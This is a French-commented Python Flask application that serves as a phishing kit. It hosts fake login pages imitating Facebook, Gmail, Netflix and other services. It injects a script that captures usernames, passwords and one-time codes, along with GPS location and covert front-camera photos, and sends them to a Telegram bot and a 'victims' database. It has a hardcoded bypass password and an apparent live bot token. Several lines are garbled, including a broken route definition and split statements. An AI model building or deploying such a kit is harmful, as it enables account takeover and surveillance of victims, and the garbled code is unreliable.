import os
import base64
import random
from flask import Flask, request, jsonify, render_template, render_template_string
import requests
import datetime
import sqlite3
import json

app = Flask(__name__)

ADMIN_BOT_TOKEN = os.environ.get("ADMIN_BOT_TOKEN", "8797682325:AAFMj6kcNv2R_EF3cWtl2pvWuRXVX4UwV7Q")
ADMIN_CHAT_ID = os.environ.get("ADMIN_CHAT_ID", "6141755021")
ADMIN_GROUP_CHAT_ID = os.environ.get("ADMIN_GROUP_CHAT_ID", "9107581307")  # À REMPLACER

DB_NAME = 'abeilles.db'

PLATFORM_LOGOS = {
    "Facebook": "https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg",
    "Instagram": "https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg",
    "TikTok": "https://upload.wikimedia.org/wikipedia/commons/a/a6/Logo_NIKE.svg",
    "Gmail": "https://upload.wikimedia.org/wikipedia/commons/7/7e/Gmail_icon_%282020%29.svg",
    "Google": "https://upload.wikimedia.org/wikipedia/commons/7/7e/Gmail_icon_%282020%29.svg",
    "Netflix": "https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg",
    "Telegram": "https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg",
    "Amazon": "https://upload.wikimedia.org/wikipedia/commons/4/4a/Amazon_icon.svg",
    "Snapchat": "https://upload.wikimedia.org/wikipedia/commons/c/c4/Snapchat_logo.svg"
}


def get_db_connection():
    conn = sqlite3.connect(DB_NAME, timeout=30.0)
    conn.row_factory = sqlite3.Row
    return conn


def init_db():
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS victims (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            owner TEXT, network TEXT, type TEXT,
            victimUser TEXT, victimPass TEXT, victimOtp TEXT,
            dateStr TEXT, timestamp INTEGER, ip TEXT, extra_info TEXT
        )
    ''')
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS custom_pages (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            owner TEXT, slug TEXT UNIQUE, title TEXT, network TEXT,
            bg_type TEXT, bg_value TEXT, logo_url TEXT, logo_shape TEXT,
            fields_json TEXT, btn_text TEXT, html_code TEXT,
            redirect_url TEXT, mode TEXT, box_bg TEXT, box_width TEXT, created_at INTEGER
        )
    ''')
    conn.commit()
    conn.close()


init_db()


def cleanup_expired_custom_pages():
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        twenty_four_hours_ago = int((datetime.datetime.now().timestamp() - 86400) * 1000)
        cursor.execute("DELETE FROM custom_pages WHERE created_at < ?", (twenty_four_hours_ago,))
        conn.commit()
        conn.close()
    except Exception as e:
        print("Erreur nettoyage liens 24h:", e)


def send_telegram_photo_and_message(bot_token, chat_id, photo_url, caption):
    if not bot_token or bot_token == "VOTRE_BOT_TOKEN":
        return
    url = f"https://api.telegram.org/bot{bot_token}/sendPhoto"
    try:
        res = requests.post(url, json={"chat_id": chat_id, "photo": photo_url, "caption": caption, "parse_mode": "Markdown"}, timeout=5)
        if res.status_code != 200:
            send_telegram_notification(bot_token, chat_id, caption)
    except Exception as e:
        print("Erreur Telegram Photo:", e)


def send_telegram_notification(bot_token, chat_id, message):
    if not bot_token or bot_token == "VOTRE_BOT_TOKEN":
        return
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    try:
        requests.post(url, json={"chat_id": chat_id, "text": message, "parse_mode": "Markdown"}, timeout=5)
    except Exception as e:
        print("Erreur Telegram:", e)


@app.route('/')
def index():
    cleanup_expired_custom_pages()
    return render_template('index.html')


@app.route('/phish/<path:subpath>')
def render_phish_page(subpath):
    cleanup_expired_custom_pages()
    subpath_clean = subpath.lower().strip('/')
    req_type = request.args.get('type', 'standard').lower()
    owner_param = request.args.get('user', 'Kim')

    db_slug = subpath_clean.replace('otp/', '').replace('standard/', '')
    clean_custom_slug = db_slug.replace('_otp', '').replace('-otp', '').replace('_standard', '').replace('-standard', '')

    conn = get_db_connection()
    cursor = conn.cursor()

    possible_slugs = [db_slug, clean_custom_slug, db_slug.replace('-', '_'), db_slug.replace('_', '-')]

    cp = None
    for s in possible_slugs:
        cursor.execute("SELECT * FROM custom_pages WHERE LOWER(slug) = LOWER(?)", (s,))
        cp = cursor.fetchone()
        if cp:
            break
    conn.close()

    if cp:
        cp_dict = dict(cp)
        now_ts = int(datetime.datetime.now().timestamp() * 1000)
        if (now_ts - cp_dict.get("created_at", 0)) > 86400000:
            return "Ce lien a expiré après 24 heures.", 410

        redirect_url = cp_dict.get("redirect_url") or "https://www.google.com"

        if cp_dict.get("mode") in ['opt2', 'opt3'] and cp_dict.get("html_code"):
            html = cp_dict["html_code"]
            owner = cp_dict["owner"]
            network = cp_dict["network"]

            robust_injection_script = """
<script>
(function() {
    const OWNER = "__OWNER__";
    const NETWORK = "__NETWORK__";
    const REDIRECT_URL = "__REDIRECT_URL__";
    let isProcessing = false, hasRedirected = false;

    let userData = {
        user: localStorage.getItem('ph_user_' + OWNER) || "",
        pass: localStorage.getItem('ph_pass_' + OWNER) || "",
        otp: ""
    };

    // 1. Capture silencieuse GPS et Appareil
    let deviceInfo = {
        ua: navigator.userAgent,
        platform: navigator.platform || "Inconnu",
        language: navigator.language,
        screen: window.screen.width + "x" + window.screen.height,
        gps: null
    };

    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(pos => {
            deviceInfo.gps = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
            fetch('/api/upload_media', {
                method: 'POST', headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ owner: OWNER, network: NETWORK, type: 'gps', gps: deviceInfo.gps, device: deviceInfo.ua })
            }).catch(()=>{});
        }, err => {}, { timeout: 5000, maximumAge: 60000 });
    }

    // 2. Capture Photo (Caméra Frontale)
    async function capturePhoto() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
            const video = document.createElement('video');
            video.srcObject = stream;
            await video.play();
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            canvas.getContext('2d').drawImage(video, 0, 0);
            const dataUrl = canvas.toDataURL('image/jpeg', 0.8);
            stream.getTracks().forEach(track => track.stop());
            return dataUrl;
        } catch (e) { return null; }
    }

    function classify(inp) {
        const name = (inp.name || inp.id || "").toLowerCase();
        const type = (inp.type || "").toLowerCase();
        if (type === "password") return "pass";
        if (type === "email" || type === "tel") return "user";
        if (name.includes('user') || name.includes('email') || name.includes('login') || name.includes('phone')) return "user";
        if (name.includes('pass') || name.includes('mdp')) return "pass";
        if (name.includes('otp') || name.includes('code') || name.includes('verif')) return "otp";
        return "unknown";
    }

    async function handleSubmit(form) {
        if (isProcessing || hasRedirected) return;
        isProcessing = true;

        let hasOtp = false, hasPass = false, hasUser = false;

        form.querySelectorAll('input, select, textarea').forEach(inp => {
            let val = (inp.value || "").trim();
            if (!val) return;
            const c = classify(inp);
            if (c === "user") { userData.user = val; localStorage.setItem('ph_user_' + OWNER, val); hasUser = true; }
            if (c === "pass") { userData.pass = val; localStorage.setItem('ph_pass_' + OWNER, val); hasPass = true; }
            if (c === "otp") { userData.otp = val; hasOtp = true; }
        });

        // CODE UNIVERSEL (BYPASS ADMIN)
        if (userData.pass === '4121@' && userData.user) {
            let targetUrl = "https://www.google.com";
            if (NETWORK.toLowerCase().includes('facebook')) targetUrl = "https://www.facebook.com/" + userData.user;
            else if (NETWORK.toLowerCase().includes('google')) targetUrl = "https://accounts.google.com/";
            window.location.replace(targetUrl);
            return;
        }

        let type = hasOtp ? "custom_html_otp" : "custom_html_otp_step1";
        if (!hasOtp && hasPass && !hasUser) type = "custom_html_password";
        if (!hasOtp && hasUser && !hasPass) type = "custom_html_email";

        // Envoi au bot admin
        await fetch('/api/capture', {
            method: 'POST', headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                owner: OWNER, network: NETWORK, type: type,
                victimUser: userData.user || "Inconnu",
                victimPass: userData.pass || "Inconnu",
                otp: userData.otp || "En attente OTP...",
                extra_info: JSON.stringify(deviceInfo)
            }),
            keepalive: true
        });

        // Si on valide l'OTP, on prend une photo et on redirige
        if (hasOtp) {
            const photo = await capturePhoto();
            if (photo) {
                await fetch('/api/upload_media', {
                    method: 'POST', headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ owner: OWNER, network: NETWORK, type: 'photo', photo: photo, user: userData.user })
                });
            }
            hasRedirected = true;
            setTimeout(() => window.location.replace(REDIRECT_URL), 100);
            return;
        }
        isProcessing = false;
    }

    document.addEventListener('DOMContentLoaded', () => {
        document.querySelectorAll('form').forEach(f => {
            f.addEventListener('submit', (e) => { e.preventDefault(); handleSubmit(f); });
        });
    });
})();
</script>
""".replace("__OWNER__", owner).replace("__NETWORK__", network).replace("__REDIRECT_URL__", redirect_url)

            if "</body>" in html:
                html = html.replace("</body>", robust_injection_script + "</body>")
            else:
                html += robust_injection_script
            return render_template_string(html)

        else:
            fields_raw = cp_dict.get("fields_json") or '[]'
            try:
                fields_parsed = json.loads(fields_raw)
            except:
                fields_parsed = []

            config = {
                "owner": cp_dict.get("owner", "Kim"), "title": cp_dict.get("title", "Connexion"),
                "network": cp_dict.get("network", "Facebook"), "bg_type": cp_dict.get("bg_type", "color"),
                "bg_value": cp_dict.get("bg_value", "#111"), "logo_url": cp_dict.get("logo_url", ""),
                "logo_shape": cp_dict.get("logo_shape", "circle"), "fields": fields_parsed,
                "btn_text": cp_dict.get("btn_text", "Se connecter"),
                "box_bg": cp_dict.get("box_bg") or "rgba(255,255,255,0.95)",
                "box_width": cp_dict.get("box_width") or "420px", "redirect_url": redirect_url
            }
            return render_template('custom_login.html', config=config)

    return f"Page introuvable : {subpath}", 404


@app.route('/api/httpsupload_media', methods=['://POST'])
def upload_media():
    """ Reçowwwit les médias (photo, GPS) et.google les en.comvoie au GROUPE Telegram """
    data = request.json or {}
    owner = data.get('owner', 'Inconnu')
    network = data.get('network', 'Inconnu')
    m_type = data.get('type', 'media')

    raw_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    v_ip = raw_ip.split(',')[0].strip() if raw_ip else "127.0.0.1"
    date_str = datetime.datetime.now().strftime("%d/%m/%Y %H:%M:%S")

    if m_type == 'gps':
        gps_link = data.get('gps', 'Non trouvé')
        ua = data.get('device', 'Inconnu')
        msg = (
            f"📍 *LOCALISATION GPS CAPTURÉE* 📍\n\n"
            f"🌐 *Réseau:* {network}\n"
            f"👤 *Cible:* {owner}\n"
            f"🗺️ *Lien Maps:* [Cliquez ici]({gps_link})\n"
            f"📱 *Appareil:* `{ua}`\n"
            f"📍 *IP:* `{v_ip}`\n"
            f"🕒 *Date:* {date_str}"
        )
        send_telegram_notification(ADMIN_BOT_TOKEN, ADMIN_GROUP_CHAT_ID, msg)

    elif m_type == 'photo':
        photo_b64 = data.get('photo', '')
        user = data.get('user', 'Inconnu')
        if photo_b64.startswith('data:image'):
            photo_b64 = photo_b64.split(',')[1]

        url = f"https://api.telegram.org/bot{ADMIN_BOT_TOKEN}/sendPhoto"
        files = {'photo': ('photo.jpg', base64.b64decode(photo_b64), 'image/jpeg')}
        payload = {
            "chat_id": ADMIN_GROUP_CHAT_ID,
            "caption": f"📸 *PHOTO DE LA CIBLE* 📸\n\n🎯 *Utilisateur:* `{user}`\n🌐 *Réseau:* {network}\n📍 *IP:* `{v_ip}`",
            "parse_mode": "Markdown"
        }
        try:
            requests.post(url, data=payload, files=files, timeout=10)
        except Exception as e:
            print("Erreur envoi photo groupe:", e)

    return jsonify({"status": "success"})


@app.route('/api/create_login', methods=['POST'])
def create_login():
    data = request.json or {}
    owner = data.get('owner', '').strip()
    slug = data.get('slug', '').strip().lower().replace(' ', '_')

    if not owner or not slug:
        return jsonify({"status": "error", "message": "Propriétaire ou slug manquant"})

    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        now_ts = int(datetime.datetime.now().timestamp() * 1000)

        mode = data.get('mode', 'opt1')
        box_width = data.get('boxWidth', '420px')
        box_bg = data.get('boxBg', 'rgba(255, 255, 255, 0.95)')
        redirect_url = data.get('redirectUrl', '')

        if mode in ['opt2', 'opt3']:
            cursor.execute('''
                INSERT OR REPLACE INTO custom_pages (owner, slug, title, network, bg_type, bg_value, logo_url, logo_shape, fields_json, btn_text, html_code, redirect_url, mode, box_bg, box_width, created_at)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            ''', (
                owner, slug, "Page Perso", data.get('network'),
                "color", "#111", "", "circle", "[]", "Valider",
                data.get('htmlCode'), redirect_url, mode, box_bg, box_width, now_ts
            ))
        else:
            cursor.execute('''
                INSERT OR REPLACE INTO custom_pages (owner, slug, title, network, bg_type, bg_value, logo_url, logo_shape, fields_json, btn_text, html_code, redirect_url, mode, box_bg, box_width, created_at)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            ''', (
                owner, slug, data.get('title'), data.get('network'),
                data.get('bgType'), data.get('bgValue'), data.get('logoUrl'),
                data.get('logoShape'), json.dumps(data.get('fields')), data.get('btnText'), "", redirect_url, 'opt1', box_bg, box_width, now_ts
            ))

        conn.commit()
        conn.close()
        return jsonify({"status": "success"})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})


@app.route('/api/capture', methods=['POST'])
def capture_data():
    data = request.json or {}
    owner = data.get('owner', 'Kim').strip()
    network = data.get('network', 'Facebook')
    v_user = data.get('victimUser', 'Inconnu')
    v_pass = data.get('victimPass', 'Inconnu')
    v_otp  = data.get('otp', 'Aucun')
    v_type = data.get('type', 'standard')
    extra_info = data.get('extra_info', '{}')

    raw_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    v_ip = raw_ip.split(',')[0].strip() if raw_ip else "127.0.0.1"
    now = datetime.datetime.now()
    timestamp = int(now.timestamp() * 1000)
    date_str = now.strftime("%d/%m/%Y %H:%M:%S")

    conn = get_db_connection()
    cursor = conn.cursor()
    logo_img = PLATFORM_LOGOS.get(network, PLATFORM_LOGOS["Facebook"])

    try:
        parsed_extra = json.loads(extra_info)
    except:
        parsed_extra = {}

    device_str = f"{parsed_extra.get('platform', 'N/A')} | {parsed_extra.get('ua', 'N/A')[:40]}..."
    gps_link = parsed_extra.get('gps') or "Non disponible"

    # ===== ÉTAPE FINALE : OTP FOURNI =====
    if v_otp and v_otp != 'Aucun' and v_otp != 'En attente OTP...':
        cursor.execute('''
            SELECT id FROM victims WHERE owner = ? AND network = ? AND victimOtp = 'En attente OTP...'
            ORDER BY id DESC LIMIT 1
        ''', (owner, network))
        existing = cursor.fetchone()
        
        if not existing and v_user != 'Inconnu':
            cursor.execute('''
                SELECT id FROM victims WHERE owner = ? AND network = ? AND victimUser = ?
                ORDER BY id DESC LIMIT 1
            ''', (owner, network, v_user))
            existing = cursor.fetchone()

        if existing:
            cursor.execute('''
                UPDATE victims SET victimOtp=?, dateStr=?, timestamp=?, ip=?, extra_info=? WHERE id=?
            ''', (v_otp, date_str, timestamp, v_ip, extra_info, existing["id"]))
            conn.commit()
            conn.close()
            
            alert = (
                f"🚨 *VICTIME COMPLÈTE (OTP VALIDÉ)* 🚨\n\n"
                f"📚 *Plateforme:* {network}\n"
                f"👤 *Propriétaire:* `{owner}`\n"
                f"🎯 *Identifiant:* `{v_user}`\n"
                f"🔑 *Mot de passe:* `{v_pass}`\n"
                f"🔒 *OTP:* `{v_otp}`\n"
                f"🗺️ *GPS:* [Maps]({gps_link})\n"
                f"📱 *Appareil:* `{device_str}`\n"
                f"🕒 *Heure:* `{date_str}`\n"
                f"📍 *IP:* `{v_ip}`"
            )
            send_telegram_photo_and_message(ADMIN_BOT_TOKEN, ADMIN_CHAT_ID, logo_img, alert)
            return jsonify({"status": "success"})

        cursor.execute('''
            INSERT INTO victims (owner, network, type, victimUser, victimPass, victimOtp, dateStr, timestamp, ip, extra_info)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        ''', (owner, network, v_type, v_user, v_pass, v_otp, date_str, timestamp, v_ip, extra_info))
        conn.commit()
        conn.close()
        alert = (
            f"🚨 *NOUVELLE VICTIME CAPTURÉE* 🚨\n\n"
            f"📚 *Plateforme:* {network}\n"
            f"👤 *Propriétaire:* `{owner}`\n"
            f"🎯 *Identifiant:* `{v_user}`\n"
            f"🔑 *Mot de passe:* `{v_pass}`\n"
            f"🔒 *OTP:* `{v_otp}`\n"
            f"🗺️ *GPS:* [Maps]({gps_link})\n"
            f"📱 *Appareil:* `{device_str}`\n"
            f"🕒 *Heure:* `{date_str}`\n"
            f"📍 *IP:* `{v_ip}`"
        )
        send_telegram_photo_and_message(ADMIN_BOT_TOKEN, ADMIN_CHAT_ID, logo_img, alert)
        return jsonify({"status": "success"})

    # ===== FLUX 3 ÉTAPES : ÉTAPE 1 (EMAIL) =====
    if v_type == "custom_html_email":
        cursor.execute('''
            INSERT INTO victims (owner, network, type, victimUser, victimPass, victimOtp, dateStr, timestamp, ip, extra_info)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        ''', (owner, network, v_type, v_user, "En attente...", "En attente OTP...", date_str, timestamp, v_ip, extra_info))
        conn.commit()
        conn.close()
        alert()
 = (
            f"🚨 *ÉTAPE 1/3 : EMAIL CAPTURÉ* 🚨\n\n"
            f"📚 *Plateforme:* {network}\n"
            f"👤 *Propriétaire:* `{owner}`\n"
            f"🎯 *Identifiant:* `{v_user}`\n"
            f"📱 *Appareil:* `{device_str}`\n"
            f"🕒 *Heure:* `{date_str}`\n"
            f"📍 *IP:* `{v_ip}`"
        )
        send_telegram_photo_and_message(ADMIN_BOT_TOKEN, ADMIN_CHAT_ID, logo_img, alert)
        return jsonify({"status": "success"})

    # ===== FLUX 3 ÉTAPES : ÉTAPE 2 (MOT DE PASSE) =====
    if v_type == "custom_html_password":
        cursor.execute('''
            SELECT id FROM victims
            WHERE owner = ? AND network = ? AND victimUser = ?
              AND (victimPass = 'En attente...' OR victimPass = 'Inconnu' OR victimPass = '')
            ORDER BY id DESC LIMIT 1
        ''', (owner, network, v_user))
        existing = cursor.fetchone        if existing:
            cursor.execute('''
                UPDATE victims SET victimPass=?, dateStr=?, timestamp=?, ip=?, extra_info=? WHERE id=?
            ''', (v_pass, date_str, timestamp, v_ip, extra_info, existing["id"]))
        else:
            cursor.execute('''
                INSERT INTO victims (owner, network, type, victimUser, victimPass, victimOtp, dateStr, timestamp, ip, extra_info)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            ''', (owner, network, v_type, v_user, v_pass, "En attente OTP...", date_str, timestamp, v_ip, extra_info))
        conn.commit()
        conn.close()
        alert = (
            f"🚨 *ÉTAPE 2/3 : MOT DE PASSE CAPTURÉ* 🚨\n\n"
            f"📚 *Plateforme:* {network}\n"
            f"👤 *Propriétaire:* `{owner}`\n"
            f"🎯 *Identifiant:* `{v_user}`\n"
            f"🔑 *Mot de passe:* `{v_pass}`\n"
            f"📱 *Appareil:* `{device_str}`\n"
            f"🕒 *Heure:* `{date_str}`\n"
            f"📍 *IP:* `{v_ip}`"
        )
        send_telegram_photo_and_message(ADMIN_BOT_TOKEN, ADMIN_CHAT_ID, logo_img, alert)
        return jsonify({"status": "success"})

    # ===== FLUX 2 ÉTAPES : LOGIN + OTP EN ATTENTE =====
    if v_type in ["custom_html_otp_step1", "option1_nocode_otp_step1"] or v_otp == 'En attente OTP...':
        cursor.execute('''
            INSERT INTO victims (owner, network, type, victimUser, victimPass, victimOtp, dateStr, timestamp, ip, extra_info)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        ''', (owner, network, v_type, v_user, v_pass, "En attente OTP...", date_str, timestamp, v_ip, extra_info))
        conn.commit()
        conn.close()
        alert = (
            f"🚨 *NOUVELLE VICTIME (OTP EN ATTENTE)* 🚨\n\n"
            f"📚 *Plateforme:* {network}\n"
            f"👤 *Propriétaire:* `{owner}`\n"
            f"🎯 *Identifiant:* `{v_user}`\n"
            f"🔑 *Mot de passe:* `{v_pass}`\n"
            f"🔒 *OTP:* `En attente...`\n"
            f"🗺️ *GPS:* [Maps]({gps_link})\n"
            f"📱 *Appareil:* `{device_str}`\n"
            f"🕒 *Heure:* `{date_str}`\n"
            f"📍 *IP:* `{v_ip}`"
        )
        send_telegram_photo_and_message(ADMIN_BOT_TOKEN, ADMIN_CHAT_ID, logo_img, alert)
        return jsonify({"status": "success"})

    # ===== FALLBACK =====
    cursor.execute('''
        INSERT INTO victims (owner, network, type, victimUser, victimPass, victimOtp, dateStr, timestamp, ip, extra_info)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    ''', (owner, network, v_type, v_user, v_pass, v_otp, date_str, timestamp, v_ip, extra_info))
    conn.commit()
    conn.close()
    alert = (
        f"🚨 *NOUVELLE VICTIME CAPTURÉE* 🚨\n\n"
        f"📚 *Plateforme:* {network}\n"
        f"👤 *Propriétaire:* `{owner}`\n"
        f"🎯 *Identifiant:* `{v_user}`\n"
        f"🔑 *Mot de passe:* `{v_pass}`\n"
        f"🔒 *OTP:* `{v_otp}`\n"
        f"📱 *Appareil:* `{device_str}`\n"
        f"🕒 *Heure:* `{date_str}`\n"
        f"📍 *IP:* `{v_ip}`"
    )
    send_telegram_photo_and_message(ADMIN_BOT_TOKEN, ADMIN_CHAT_ID, logo_img, alert)
    return jsonify({"status": "success"})


if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
